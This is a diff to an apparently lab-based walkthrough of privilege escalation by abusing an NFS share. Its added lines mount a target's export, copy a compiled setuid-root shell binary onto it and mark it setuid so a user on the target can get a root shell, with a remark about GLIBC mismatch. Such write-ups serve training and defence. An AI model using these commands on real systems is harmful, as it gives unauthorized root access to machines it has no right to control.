@@ -19,8 +19,13 @@ int main(void)
 root@Pwnbox:/tmp$ gcc shell.c -o shell
 ```
 
+```
+root@Pwnbox:/tmp$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
+root@Pwnbox:/tmp$ cp shell /mnt
+root@Pwnbox:/tmp$ chmod u+s /mnt/shell #important as file is owned by root, without this user at target can't execute it
+```
 
 
 Since we set both uid and gid to 0, this would gain us a root shell at execution
 
-Note: Their is a chance that target system has GLIBC that is older and exploit 
+Note: Their is a chance that target system has GLIBC that is older and exploit compiled on our side cannot be run on target due to GLIBC requirement, at the end of the day, we can attempt to compile at target system, or resort to other means to compile.
